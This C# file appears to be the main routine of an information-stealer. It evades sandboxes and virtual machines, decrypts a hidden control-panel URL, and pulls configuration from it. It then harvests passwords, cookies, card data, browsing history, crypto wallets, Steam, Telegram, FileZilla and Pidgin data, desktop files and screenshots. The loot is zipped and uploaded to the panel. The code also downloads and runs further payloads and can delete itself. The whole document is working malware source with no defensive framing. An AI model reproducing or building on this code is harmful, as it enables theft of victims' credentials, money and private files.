using System.Linq;

namespace who
{
    using System;
    using System.IO;
    using System.Net;
    using System.Text;
    using who.APIs;
    using who.Func;
    using who.GeckoBrowsers;
    using who.Helper;

    internal static partial class Program
    {
        public static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public static void Main()
        {
            AntiAnalyses.Proc();
            AntiAnalyses.VMDetect();
            AntiAnalyses.SandboxieDetect();

            //   Helpers.AntiSNG();


            string password = "ʰʷˉ˞˜ʷ˩˾ʰ˼ʷʰ˞ˉ˜ʷʰʷʷ˼ʰʷ˜ʰʷ˜ʰ˒ʷ˜ʰʰʰʨʷʰʷʰʷʰʨʷʰʷʰ˿˜˾˩˼ˣ˯˳˃˞˜ˏ˓˃˯˳˼ˣʩʩʩʷʷʷʷ";
            byte[] url_bytes = StringToByteArray("[URL]");
            byte[] pwd_bytes = Encoding.Default.GetBytes(Encrypt.XOR(password));
            string result_encoded_string_panel = Encoding.Default.GetString(Encrypt.Encrypt_RC4(pwd_bytes, url_bytes));
            byte[] ass = Encoding.Default.GetBytes(result_encoded_string_panel);
            Dirs.WorkDirCreate();
            User.GetCountryByIP(User.IP);
            Dirs.Move();

            var request = WebRequest.Create(Encoding.Default.GetString(Encrypt.Encrypt_RC4(pwd_bytes, ass)));
            using (Stream stream = request.GetResponse().GetResponseStream())
            {
                string arguments = new StreamReader(stream).ReadToEnd();
                string[] argss = arguments.Split(',');



                bool Pass_bool = true;
                bool Steam = false;
                bool Grabber = false;
                bool Cookies_bool = false;
                bool History_bool = false;
                bool Telegram = false;
                bool Loader_bool = false;
                bool Mutex = false;
                bool Clear_bool = false;
                bool ScreenShot = false;
                bool Crypto = false;

                if (argss[12] == "1")
                    Mutex = true;

                if (!Mutex)
                {
                    Helpers.MutexCheck();
                }

                if (argss[0] == "1")
                    Pass_bool = true;
                if (argss[1] == "1")
                    Cookies_bool = true;
                if (argss[2] == "1")
                    History_bool = true;
                if (argss[3] == "1")
                    Crypto = true;
                if (argss[4] == "1")
                    Steam = true;
                if (argss[5] == "1")
                    Telegram = true;
                if (argss[6] == "1")
                    ScreenShot = true;
                if (argss[7] == "1")
                    Grabber = true;
                if (argss[10] == "1")
                    Clear_bool = true;
                if (argss[11].StartsWith("http"))
                    Loader_bool = true;

                if (Loader_bool)
                {
                    string URL = argss[11];
                    string filename = Path.GetFileName(URL);
                    Loader.Run(URL, filename);
                }


                if (Pass_bool)
                {
                    Steal.Passwords();
                    Passwords.GetPasswordsNEW();
                }

                if (History_bool)
                    History.Get();

                if (Loader_bool)
                {
                    string URL = argss[11];
                    string filename = Path.GetFileName(URL);

                    Loader.Run(URL, filename);
                }

                if (Steam)
                    Grab.Steam();

                if (Telegram)
                    Grab.NewTelegram();

                if (Cookies_bool)
                {
                    Cookies.Get();
                    Steal.Cookies();
                    CC.Get();
                }

                if (Crypto)
                {
                    Grab.DirSearch(Dirs.AppData);
                }

                if (Grabber)
                {
                    string[] extensions = argss[8].Split(':');
                    Grab.extensions.AddRange(extensions.Select(ex => ex));
                    Grab.Weight = Convert.ToInt32(argss[9]);
                    Grab.Weight *= 1024;

                    Grab.Desktop();
                }

                if (ScreenShot)
                {
                    Grab.ScreenShot();
                }



                Grab.FileZilla();
                Grab.Pidgin();

                User.GetUA();
                Helpers.UADetect();
                Helpers.InfoDetect();
                Helpers.LogDetect();

                User.GetInfo();

                Helpers.Zip();



                string log = @"" + Dirs.Temp + "\\" + User.IP + "_" + User.randomnm + ".zip";

                Post_File.GetInfoForPanel();
                Post_File.HttpUploadFile(Encoding.Default.GetString(Encrypt.Encrypt_RC4(pwd_bytes, ass)), log, "logs", "zip", Post_File.name);


                if (Clear_bool)
                {
                    Helpers.Suicide();
                }
            }

            Helpers.Clear();
            Directory.Delete(Dirs.WorkDir);
        }
    }
}